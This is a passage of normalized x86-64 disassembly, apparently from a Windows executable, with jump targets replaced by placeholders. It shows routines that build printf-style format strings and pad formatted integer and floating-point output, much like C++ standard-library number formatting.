cmp edx 0x800
je r-xdata
mov al 0x6f
jmp r-xdata
shl al 0x3
not al
and al 0x20
or al 0x58
mov al 0x75
jmp r-xdata
mov r9d [ rsp + 0xd8 ]
mov [ rcx + 0x1 ] al
mov [ rcx + 0x2 ] 0x0
lea rcx [ rsp + 0x50 ]
lea r8 [ rsp + 0x40 ]
mov edx 0x40
call sub_14003b81c
movzx r9d [ rsp + 0xd0 ]
lea rdx [ rsp + 0x30 ]
movsxd rcx eax
lea rax [ rsp + 0x50 ]
mov r8 rbx
mov [ rsp + 0x28 ] rcx
mov rcx rdi
mov [ rsp + 0x20 ] rax
call sub_14002aa80
mov rax rdi
mov rcx [ rsp + 0x90 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0xb0 ]
add rsp 0xa0
pop rdi
retn
sub_140029980
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0xa0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x90 ] rax
movups xmm0 [ r8 ]
mov ecx [ r9 + 0x18 ]
mov rbx r9
mov rdi rdx
mov [ rsp + 0x40 ] 0x25
lea rax [ rsp + 0x41 ]
movaps [ rsp + 0x30 ] xmm0
test cl 0x20
je r-xdata
test cl 0x8
je r-xdata
mov [ rsp + 0x41 ] 0x2b
lea rax [ rsp + 0x42 ]
mov edx ecx
mov [ rax ] 0x3649
mov [ rax + 0x2 ] 0x34
and edx 0xe00
cmp edx 0x400
jne r-xdata
mov [ rax ] 0x23
inc rax
cmp edx 0x800
je r-xdata
mov cl 0x6f
jmp r-xdata
shl cl 0x3
not cl
and cl 0x20
or cl 0x58
mov cl 0x64
jmp r-xdata
mov r9 [ rsp + 0xd8 ]
mov [ rax + 0x3 ] cl
lea r8 [ rsp + 0x40 ]
lea rcx [ rsp + 0x50 ]
mov edx 0x40
mov [ rax + 0x4 ] 0x0
call sub_14003b81c
movzx r9d [ rsp + 0xd0 ]
lea rdx [ rsp + 0x30 ]
movsxd rcx eax
lea rax [ rsp + 0x50 ]
mov r8 rbx
mov [ rsp + 0x28 ] rcx
mov rcx rdi
mov [ rsp + 0x20 ] rax
call sub_14002aa80
mov rax rdi
mov rcx [ rsp + 0x90 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0xb0 ]
add rsp 0xa0
pop rdi
retn
sub_140029a80
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0xa0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x90 ] rax
movups xmm0 [ r8 ]
mov ecx [ r9 + 0x18 ]
mov rbx r9
mov rdi rdx
mov [ rsp + 0x40 ] 0x25
lea rax [ rsp + 0x41 ]
movaps [ rsp + 0x30 ] xmm0
test cl 0x20
je r-xdata
test cl 0x8
je r-xdata
mov [ rsp + 0x41 ] 0x2b
lea rax [ rsp + 0x42 ]
mov edx ecx
mov [ rax ] 0x3649
mov [ rax + 0x2 ] 0x34
and edx 0xe00
cmp edx 0x400
jne r-xdata
mov [ rax ] 0x23
inc rax
cmp edx 0x800
je r-xdata
mov cl 0x6f
jmp r-xdata
shl cl 0x3
not cl
and cl 0x20
or cl 0x58
mov cl 0x75
jmp r-xdata
mov r9 [ rsp + 0xd8 ]
mov [ rax + 0x3 ] cl
lea r8 [ rsp + 0x40 ]
lea rcx [ rsp + 0x50 ]
mov edx 0x40
mov [ rax + 0x4 ] 0x0
call sub_14003b81c
movzx r9d [ rsp + 0xd0 ]
lea rdx [ rsp + 0x30 ]
movsxd rcx eax
lea rax [ rsp + 0x50 ]
mov r8 rbx
mov [ rsp + 0x28 ] rcx
mov rcx rdi
mov [ rsp + 0x20 ] rax
call sub_14002aa80
mov rax rdi
mov rcx [ rsp + 0x90 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0xb0 ]
add rsp 0xa0
pop rdi
retn
sub_140029b80
push rbx
push rbp
push rsi
push rdi
push r12
sub rsp 0xf0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xe0 ] rax
mov rbx [ r9 + 0x20 ]
mov rbp r9
mov r12 rdx
test rbx rbx
jg r-xdata
mov edx [ rbp + 0x18 ]
movsd xmm1 [ rsp + 0x148 ]
mov eax 0x24
cmp rbx rax
mov r9d ebx
cmovg r9d eax
xor esi esi
movsxd rax r9d
mov edi esi
sub rbx rax
mov eax edx
and eax 0x3000
cmp eax 0x2000
jne r-xdata
test [ r9 + 0x18 ] 0x2000
jne r-xdata
movups xmm0 [ r8 ]
mov [ rsp + 0x60 ] 0x25
lea rax [ rsp + 0x61 ]
movaps [ rsp + 0x50 ] xmm0
test dl 0x20
je r-xdata
movapd xmm0 xmm1
mulsd xmm0 [ r--data ]
ucomisd xmm0 xmm1
jpe r-xdata
mov ebx 0x6
test dl 0x10
je r-xdata
mov [ rsp + 0x61 ] 0x2b
lea rax [ rsp + 0x62 ]
xorpd xmm3 xmm3
movsd xmm4 [ r--data ]
comisd xmm3 xmm1
jbe r-xdata
je r-xdata
and edx 0x3000
mov [ rax ] 0x2a2e
cmp edx 0x2000
jne r-xdata
mov [ rax ] 0x23
inc rax
xor al al
mov al 0x1
xorpd xmm1 xmm4
jmp r-xdata
cmp edx 0x3000
jne r-xdata
mov cl 0x66
jmp r-xdata
comisd xmm1 xmm3
jbe r-xdata
nop
movsd xmm0 [ r--data ]
movsd xmm2 [ r--data ]
comisd xmm1 xmm0
jb r-xdata
mov ecx 0x67
mov r8d 0x65
cmp edx 0x1000
cmove ecx r8d
mov cl 0x61
jmp r-xdata
mov [ rax + 0x2 ] cl
lea r8 [ rsp + 0x60 ]
lea rcx [ rsp + 0x70 ]
movsd [ rsp + 0x20 ] xmm1
mov edx 0x6c
mov [ rax + 0x3 ] 0x0
call sub_14003b81c
movzx r9d [ rsp + 0x140 ]
lea rdx [ rsp + 0x50 ]
movsxd rcx eax
lea rax [ rsp + 0x70 ]
mov r8 rbp
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x38 ] rbx
mov [ rsp + 0x30 ] rdi
mov rcx r12
mov [ rsp + 0x28 ] rsi
mov [ rsp + 0x20 ] rax
call sub_14002a0a0
mov rax r12
mov rcx [ rsp + 0xe0 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0xf0
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
test al al
je r-xdata
cmp rbx 0xa
jl r-xdata
divsd xmm1 xmm2
add rsi 0xa
comisd xmm1 xmm0
jae r-xdata
xorpd xmm1 xmm4
movsd xmm0 [ r--data ]
nop [ rax + rax ] eax
cmp rsi 0x1388
jae r-xdata
cmp rdi 0x1388
jae r-xdata
sub rbx 0xa
add rdi 0xa
mulsd xmm1 xmm2
cmp rbx 0xa
jge r-xdata
comisd xmm0 xmm1
jb r-xdata
sub_140029d80
push rbx
push rbp
push rsi
push rdi
push r12
sub rsp 0xf0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xe0 ] rax
mov rbx [ r9 + 0x20 ]
mov rbp r9
mov r12 rdx
test rbx rbx
jg r-xdata
mov edx [ rbp + 0x18 ]
movsd xmm1 [ rsp + 0x148 ]
mov eax 0x24
cmp rbx rax
mov r9d ebx
cmovg r9d eax
xor esi esi
movsxd rax r9d
mov edi esi
sub rbx rax
mov eax edx
and eax 0x3000
cmp eax 0x2000
jne r-xdata
test [ r9 + 0x18 ] 0x2000
jne r-xdata
movups xmm0 [ r8 ]
mov [ rsp + 0x60 ] 0x25
lea rax [ rsp + 0x61 ]
movaps [ rsp + 0x50 ] xmm0
test dl 0x20
je r-xdata
xorpd xmm3 xmm3
movsd xmm4 [ r--data ]
comisd xmm3 xmm1
jbe r-xdata
mov ebx 0x6
test dl 0x10
je r-xdata
mov [ rsp + 0x61 ] 0x2b
lea rax [ rsp + 0x62 ]
xor al al
mov al 0x1
xorpd xmm1 xmm4
jmp r-xdata
and edx 0x3000
mov [ rax ] 0x2a2e
mov [ rax + 0x2 ] 0x4c
cmp edx 0x2000
jne r-xdata
mov [ rax ] 0x23
inc rax
comisd xmm1 xmm3
jbe r-xdata
cmp rsi 0x1388
jae r-xdata
movsd xmm0 [ r--data ]
movsd xmm2 [ r--data ]
comisd xmm1 xmm0
jb r-xdata
cmp edx 0x3000
jne r-xdata
mov cl 0x66
jmp r-xdata
test al al
je r-xdata
cmp rbx 0xa
jl r-xdata
divsd xmm1 xmm2
add rsi 0xa
comisd xmm1 xmm0
jae r-xdata
mov ecx 0x67
mov r8d 0x65
cmp edx 0x1000
cmove ecx r8d
mov cl 0x61
jmp r-xdata
mov [ rax + 0x3 ] cl
lea r8 [ rsp + 0x60 ]
lea rcx [ rsp + 0x70 ]
movsd [ rsp + 0x20 ] xmm1
mov edx 0x6c
mov [ rax + 0x4 ] 0x0
call sub_14003b81c
movzx r9d [ rsp + 0x140 ]
lea rdx [ rsp + 0x50 ]
movsxd rcx eax
lea rax [ rsp + 0x70 ]
mov r8 rbp
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x38 ] rbx
mov [ rsp + 0x30 ] rdi
mov rcx r12
mov [ rsp + 0x28 ] rsi
mov [ rsp + 0x20 ] rax
call sub_14002a0a0
mov rax r12
mov rcx [ rsp + 0xe0 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0xf0
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
xorpd xmm1 xmm4
movsd xmm0 [ r--data ]
cmp rdi 0x1388
jae r-xdata
sub rbx 0xa
add rdi 0xa
mulsd xmm1 xmm2
cmp rbx 0xa
jge r-xdata
comisd xmm0 xmm1
jb r-xdata
sub_140029f60
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x90
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x80 ] rax
movups xmm0 [ r8 ]
mov rbx r9
mov r9 [ rsp + 0xc8 ]
mov rdi rdx
lea r8 [ r--data ]
lea rcx [ rsp + 0x40 ]
mov edx 0x40
movaps [ rsp + 0x30 ] xmm0
call sub_14003b81c
movzx r9d [ rsp + 0xc0 ]
lea rdx [ rsp + 0x30 ]
movsxd rcx eax
lea rax [ rsp + 0x40 ]
mov r8 rbx
mov [ rsp + 0x28 ] rcx
mov rcx rdi
mov [ rsp + 0x20 ] rax
call sub_14002aa80
mov rax rdi
mov rcx [ rsp + 0x80 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0xa0 ]
add rsp 0x90
pop rdi
retn
sub_14002a000
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x50 ] rsi
mov rbx rdx
mov rdi rcx
mov [ rsp + 0x48 ] 0x0
mov rax [ rcx ]
movsxd r8 [ rax + 0x4 ]
lea rax [ r--data ]
mov [ r8 + rcx ] rax
mov [ rcx + 0x8 ] 0x0
mov rax [ rcx ]
movsxd rsi [ rax + 0x4 ]
add rsi rcx
mov rcx rsi
call sub_140003290
mov [ rsi + 0x48 ] rbx
mov [ rsi + 0x50 ] 0x0
mov rcx rsi
call sub_1400113e0
mov [ rsi + 0x58 ] al
cmp [ rsi + 0x48 ] 0x0
jne r-xdata
mov rax rdi
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov edx [ rsi + 0x10 ]
or edx 0x4
xor r8d r8d
mov rcx rsi
call sub_140003120
jmp r-xdata
sub_14002a0a0
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x28 ]
sub rsp 0x128
mov [ rbp - 0x50 ] 0xfffffffffffffffe
movaps [ rsp + 0x110 ] xmm6
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x8 ] rax
movzx r14d r9b
mov [ rsp + 0x78 ] r8
mov [ rsp + 0x58 ] rdx
mov [ rbp - 0x68 ] rcx
mov r15 [ rbp + 0x90 ]
mov [ rbp - 0x78 ] r15
mov rax [ rbp + 0x98 ]
mov [ rsp + 0x60 ] rax
mov rax [ rbp + 0xa0 ]
mov [ rsp + 0x68 ] rax
mov r13 [ rbp + 0xa8 ]
mov r12 [ rbp + 0xb0 ]
lea rdx [ rbp - 0x60 ]
mov rcx r8
call sub_140003240
nop
mov rcx rax
call sub_14002b720
mov rbx rax
mov [ rsp + 0x70 ] rax
mov esi 0x1
mov rdi [ rbp - 0x60 ]
test rdi rdi
je r-xdata
lea rdx [ rbp - 0x20 ]
mov rcx rbx
call sub_14002b150
nop
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x10 ]
mov [ rsp + 0x30 ] al
mov [ rbp - 0x30 ] 0xf
xor eax eax
mov [ rbp - 0x38 ] rax
mov [ rbp - 0x48 ] al
movzx ecx [ r15 ]
cmp cl 0x2b
je r-xdata
xor edx edx
lea rcx [ rbp - 0x80 ]
call sub_14003825c
mov rax [ rdi + 0x8 ]
test rax rax
je r-xdata
movsxd r15 esi
call sub_14003b85c
mov rcx [ rax ]
movzx eax [ rcx ]
mov [ rsp + 0x50 ] al
mov [ rsp + 0x51 ] 0x65
mov r8 r12
mov edx 0x65
mov rsi [ rbp - 0x78 ]
mov rcx rsi
call sub_14003b840
mov rdi rax
movsx edx [ rsp + 0x50 ]
mov r8 r12
mov rcx rsi
call sub_14003b840
mov rbx rax
test rax rax
mov edx 0x0
cmove r13 rdx
lea rcx [ rbp - 0x20 ]
mov r8 [ rbp - 0x20 ]
mov r9 [ rbp - 0x8 ]
cmp r9 0x10
cmovae rcx r8
cmp [ rcx ] 0x7f
je r-xdata
cmp cl 0x2d
je r-xdata
xor eax eax
mov ebx eax
cmp [ rdi + 0x8 ] rax
cmove rbx rdi
lea rcx [ rbp - 0x80 ]
call sub_14003828c
test rbx rbx
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
lea rax [ r12 + r13 ]
add rax [ rsp + 0x68 ]
add rax [ rsp + 0x60 ]
mov rcx [ rsp + 0x78 ]
mov rdi [ rcx + 0x28 ]
test rdi rdi
jle r-xdata
lea rax [ rbp - 0x20 ]
cmp r9 0x10
cmovae rax r8
cmp [ rax ] dl
jle r-xdata
mov esi eax
mov rbx [ rsp + 0x70 ]
mov rax [ rbx ]
mov edx esi
mov rcx rbx
call [ rax ]
dec rax
mov [ rdi + 0x8 ] rax
mov rdi rdx
cmp rdi rax
jbe r-xdata
mov r8 r12
mov rdx rsi
lea rcx [ rbp - 0x48 ]
call sub_14000a5c0
test rdi rdi
jne r-xdata
movsx edx [ rsp + 0x50 ]
mov r8 r12
mov rcx rsi
call sub_14003b840
mov rsi rax
mov r15 [ rbp - 0x78 ]
test rax rax
je r-xdata
cmp eax 0x100
je r-xdata
sub rdi rax
jmp r-xdata
test rbx rbx
jne r-xdata
mov r8b 0x30
mov rdx r13
lea rcx [ rbp - 0x48 ]
call sub_14000a700
jmp r-xdata
mov r8 r12
mov edx 0x65
mov rcx r15
call sub_14003b840
mov rsi rax
test rax rax
je r-xdata
sub rsi r15
inc rsi
movups xmm0 [ rbx ]
movaps [ rsp + 0x40 ] xmm0
lea r9 [ rsi - 0x1 ]
movzx eax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] al
mov r8 r15
lea rdx [ rsp + 0x40 ]
lea rcx [ rbp - 0x78 ]
call sub_14002afe0
mov r11 rax
mov rax [ rax ]
mov [ rbx ] rax
mov rax [ r11 + 0x8 ]
mov [ rbx + 0x8 ] rax
movups xmm6 [ r11 ]
movaps [ rsp + 0x40 ] xmm6
mov rbx [ rsp + 0x48 ]
mov rax [ rsp + 0x60 ]
test rax rax
je r-xdata
test r15 r15
je r-xdata
movups xmm0 [ rbx ]
movaps [ rsp + 0x40 ] xmm0
test rdi rdi
je r-xdata
mov eax [ rcx + 0x18 ]
and eax 0x1c0
mov rbx [ rsp + 0x58 ]
cmp eax 0x40
je r-xdata
sub rdi rsi
mov r9b 0x30
mov r8 r13
mov rdx rdi
lea rcx [ rbp - 0x48 ]
call sub_1400093c0
mov r8b 0x30
mov rdx [ rsp + 0x60 ]
lea rcx [ rbp - 0x48 ]
call sub_14000a700
xor eax eax
mov [ rsp + 0x60 ] rax
lea rcx [ rbp - 0x48 ]
test rbx rbx
jne r-xdata
movups xmm0 [ rbx ]
movaps [ rsp + 0x40 ] xmm0
movzx eax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] al
mov r9 r12
mov r8 r15
lea rdx [ rsp + 0x40 ]
lea rcx [ rbp - 0x60 ]
call sub_14002afe0
mov r11 rax
mov rax [ rax ]
mov [ rbx ] rax
mov rax [ r11 + 0x8 ]
mov [ rbx + 0x8 ] rax
movups xmm0 [ r11 ]
movaps [ rsp + 0x40 ] xmm0
test r13 r13
je r-xdata
sub rsi r15
inc rsi
movups xmm0 [ rbx ]
movaps [ rsp + 0x40 ] xmm0
lea r9 [ rsi - 0x1 ]
movzx eax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] al
mov r8 r15
lea rdx [ rsp + 0x40 ]
lea rcx [ rbp - 0x60 ]
call sub_14002afe0
mov r11 rax
mov rax [ rax ]
mov [ rbx ] rax
mov rax [ r11 + 0x8 ]
mov [ rbx + 0x8 ] rax
movups xmm6 [ r11 ]
movaps [ rsp + 0x40 ] xmm6
mov rbx [ rsp + 0x48 ]
test r13 r13
je r-xdata
mov rdx [ rsp + 0x58 ]
movups [ rdx ] xmm6
movaps [ rsp + 0x40 ] xmm6
mov rcx [ rsp + 0x70 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
movzx r11d al
test rbx rbx
je r-xdata
nop [ rax ] eax
movups xmm0 [ rbx ]
movaps [ rsp + 0x40 ] xmm0
test rdi rdi
je r-xdata
movups xmm6 [ rbx ]
movaps [ rsp + 0x40 ] xmm6
movzx r8d [ rsi ]
mov rcx [ rsp + 0x48 ]
test rcx rcx
je r-xdata
movups [ rbx ] xmm0
xor eax eax
mov edi eax
jmp r-xdata
mov rbx [ rsp + 0x48 ]
nop
sub rbx rsi
lea rdx [ rbx + 0x1 ]
mov r9b 0x30
mov r8 [ rsp + 0x68 ]
call sub_1400093c0
mov r9b 0x30
mov r8 [ rsp + 0x60 ]
mov rdx rbx
lea rcx [ rbp - 0x48 ]
call sub_1400093c0
xor r13d r13d
mov [ rsp + 0x68 ] r13
mov r8b 0x30
mov rdx [ rsp + 0x60 ]
call sub_14000a700
xor r13d r13d
jmp r-xdata
movups [ rbx ] xmm0
mov rax [ rsp + 0x78 ]
xor esi esi
mov [ rax + 0x28 ] rsi
movups xmm0 [ rbx ]
movaps [ rsp + 0x40 ] xmm0
test rdi rdi
je r-xdata
mov rbx [ rsp + 0x48 ]
mov rdx [ rsp + 0x58 ]
movups [ rdx ] xmm6
xor eax eax
mov r13d eax
movaps [ rsp + 0x40 ] xmm6
mov rax [ rsp + 0x78 ]
test [ rax + 0x18 ] 0x4
lea rcx [ r--data ]
lea rax [ r--data ]
cmovne rax rcx
movzx r8d [ rax ]
test rbx rbx
je r-xdata
nop
mov [ rsp + 0x40 ] 0x1
movaps xmm6 [ rsp + 0x40 ]
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov [ rsp + 0x40 ] 0x1
jmp r-xdata
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov rbx [ rsp + 0x48 ]
mov [ rsp + 0x40 ] 0x1
movaps xmm6 [ rsp + 0x40 ]
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov [ rsp + 0x40 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
lea rsi [ rbp - 0x48 ]
cmp r8 0x10
cmovae rsi [ rbp - 0x48 ]
mov [ rbp - 0x78 ] rsi
xor edx edx
nop
mov [ rsp + 0x60 ] r13
lea rdi [ rbp - 0x20 ]
cmp [ rbp - 0x8 ] 0x10
cmovae rdi [ rbp - 0x20 ]
lea rcx [ rbp - 0x48 ]
cmp [ rbp - 0x30 ] 0x10
cmovae rcx [ rbp - 0x48 ]
lea rdx [ rsp + 0x50 ]
call sub_14003b894
mov rsi rax
movzx ecx [ rdi ]
mov r8 [ rbp - 0x30 ]
mov r12 [ rbp - 0x38 ]
cmp cl 0x7f
je r-xdata
mov rbx [ rbp - 0x68 ]
movups [ rbx ] xmm0
cmp [ rbp - 0x30 ] 0x10
jb r-xdata
mov rbx [ rsp + 0x48 ]
mov [ rsp + 0x40 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov [ rsp + 0x40 ] 0x1
movaps xmm6 [ rsp + 0x40 ]
mov rax [ rbx + 0x48 ]
cmp [ rax ] r13
je r-xdata
mov [ rsp + 0x40 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
movups [ rbx ] xmm6
add r15 rsi
sub r12 rsi
mov rbx [ rsp + 0x48 ]
movzx edx r11b
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
dec rax
mov [ rsp + 0x60 ] rax
jne r-xdata
mov rax [ rbx ]
mov edx 0x30
mov rcx rbx
call [ rax + 0x18 ]
cmp eax 0xffffffff
jne r-xdata
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rsp + 0x40 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
movzx edx r8b
mov rax [ rcx ]
call [ rax + 0x18 ]
mov rax [ rcx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
test rbx rbx
je r-xdata
movaps xmm0 [ rsp + 0x40 ]
mov rbx [ rsp + 0x58 ]
movzx edx r14b
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
movsx rdx cl
mov rax rsi
sub rax r15
cmp rdx rax
jae r-xdata
mov [ rbp - 0x30 ] 0xf
mov [ rbp - 0x38 ] rsi
mov [ rbp - 0x48 ] 0x0
cmp [ rbp - 0x8 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x48 ]
call j_sub_14003ad04
mov [ rsp + 0x40 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] rsi
je r-xdata
test rbx rbx
je r-xdata
movaps xmm0 [ rsp + 0x40 ]
mov rbx [ rsp + 0x58 ]
mov rax [ rbx ]
mov edx 0x30
mov rcx rbx
call [ rax + 0x18 ]
cmp eax 0xffffffff
jne r-xdata
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
movzx edx r8b
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] r13d
jle r-xdata
test rbx rbx
je r-xdata
movaps xmm6 [ rsp + 0x40 ]
mov rax [ rbx ]
mov edx 0x30
mov rcx rbx
call [ rax + 0x18 ]
cmp eax 0xffffffff
jne r-xdata
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rsp + 0x40 ] 0x1
jmp r-xdata
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov rbx [ rsp + 0x58 ]
movups [ rbx ] xmm6
movaps [ rsp + 0x40 ] xmm6
mov rax [ rsp + 0x68 ]
test rax rax
je r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] r11b
movzx eax r11b
jmp r-xdata
test rbx rbx
je r-xdata
movaps xmm6 [ rsp + 0x40 ]
mov rax [ rsp + 0x60 ]
mov rax [ rsp + 0x60 ]
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] 0x30
jmp r-xdata
test rbx rbx
je r-xdata
jmp r-xdata
movzx edx r14b
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
movups [ rbx ] xmm6
inc rsi
mov [ rbp - 0x78 ] rsi
dec r12
dec [ rax ]
mov rcx [ rcx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] r8b
movzx eax r8b
jmp r-xdata
dec rdi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] r14b
movzx eax r14b
jmp r-xdata
sub rsi rdx
cmp r12 rsi
jb r-xdata
mov rax rbx
mov rcx [ rbp + 0x8 ]
xor rcx rsp
call sub_14003a6a0
movaps xmm6 [ rsp + 0x110 ]
add rsp 0x128
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
mov rcx [ rbp - 0x20 ]
call j_sub_14003ad04
test rbx rbx
je r-xdata
movaps xmm0 [ rsp + 0x40 ]
movzx edx r14b
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] esi
jle r-xdata
dec r13
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] 0x30
jmp r-xdata
mov rbx [ rsp + 0x58 ]
movups [ rbx ] xmm6
add r15 rsi
sub r12 rsi
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] r8b
movzx eax r8b
jmp r-xdata
dec r13
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] 0x30
jmp r-xdata
dec rax
mov [ rsp + 0x68 ] rax
jne r-xdata
mov rax [ rbx ]
mov edx 0x30
mov rcx rbx
call [ rax + 0x18 ]
cmp eax 0xffffffff
jne r-xdata
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
cmp eax 0xffffffff
jne r-xdata
dec rdi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] r14b
movzx eax r14b
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
lea rcx [ r--data ]
call sub_140037948
or rax 0xffffffffffffffff
sub rax r12
cmp rax 0x1
jbe r-xdata
dec rdi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] r14b
movzx eax r14b
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
test rbx rbx
je r-xdata
movaps xmm6 [ rsp + 0x40 ]
mov rbx [ rsp + 0x58 ]
mov rax [ rsp + 0x68 ]
mov rax [ rsp + 0x68 ]
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] 0x30
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
lea rcx [ r--data ]
call sub_1400378ec
lea rbx [ r12 + 0x1 ]
cmp rbx 0xfffffffffffffffe
ja r-xdata
cmp eax 0xffffffff
jne r-xdata
lea rcx [ r--data ]
call sub_1400378ec
cmp r8 rbx
jae r-xdata
test rbx rbx
jne r-xdata
mov r8 r12
mov rdx rbx
lea rcx [ rbp - 0x48 ]
call sub_1400061b0
jmp r-xdata
setne al
test al al
je r-xdata
mov [ rbp - 0x38 ] r13
lea rax [ rbp - 0x48 ]
cmp r8 0x10
cmovae rax [ rbp - 0x48 ]
mov [ rax ] bl
mov r12 [ rbp - 0x38 ]
mov r8 [ rbp - 0x30 ]
test rbx rbx
lea rax [ rdi + 0x1 ]
cmp [ rax ] 0x0
cmovg rdi rax
movzx ecx [ rdi ]
cmp cl 0x7f
jne r-xdata
lea rdx [ rbp - 0x48 ]
mov rax [ rbp - 0x48 ]
cmp r8 0x10
cmovae rdx rax
lea rcx [ rbp - 0x48 ]
cmovae rcx rax
sub r12 rsi
add rdx rsi
lea rcx [ rcx + rsi + 0x1 ]
mov r8 r12
call sub_14003a8c0
lea r11 [ rbp - 0x48 ]
cmp [ rbp - 0x30 ] 0x10
cmovae r11 [ rbp - 0x48 ]
mov [ r11 + rsi ] 0x0
mov [ rbp - 0x38 ] rbx
lea rax [ rbp - 0x48 ]
cmp [ rbp - 0x30 ] 0x10
cmovae rax [ rbp - 0x48 ]
mov [ rax + rbx ] 0x0
mov r8 [ rbp - 0x30 ]
mov r12 [ rbp - 0x38 ]
test cl cl
jle r-xdata
jmp r-xdata
sub_14002aa80
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0xf ]
sub rsp 0xc8
mov [ rbp - 0x31 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x1 ] rax
movzx esi r9b
mov [ rbp - 0x59 ] r8
mov [ rbp - 0x79 ] rdx
mov [ rbp - 0x49 ] rcx
mov r13 [ rbp + 0x77 ]
mov [ rbp - 0x69 ] r13
mov r15 [ rbp + 0x7f ]
lea rdx [ rbp - 0x51 ]
mov rcx r8
call sub_140003240
nop
mov rcx rax
call sub_14002b720
mov r14 rax
mov [ rbp - 0x41 ] rax
mov r12d 0x1
mov rdi [ rbp - 0x51 ]
test rdi rdi
je r-xdata
lea rdx [ rbp - 0x29 ]
mov rcx r14
call sub_14002b150
nop
